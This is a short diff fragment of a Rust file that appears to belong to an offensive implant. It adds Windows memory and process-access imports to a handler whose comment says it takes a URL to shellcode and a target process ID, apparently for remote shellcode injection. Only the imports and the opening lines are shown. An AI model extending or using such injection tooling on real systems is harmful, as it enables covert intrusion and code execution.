@@ -1,7 +1,7 @@
 use std::error::Error;
-use std::env::current_dir;
+#[cfg(windows)]  use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
 
-pub async fn handle(s: String) -> Result<String, Box<dyn Error>> {
+pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
     #[cfg(windows)] {
         // Input: url to shellcode -p pid
         let mut args = s.split(" ");
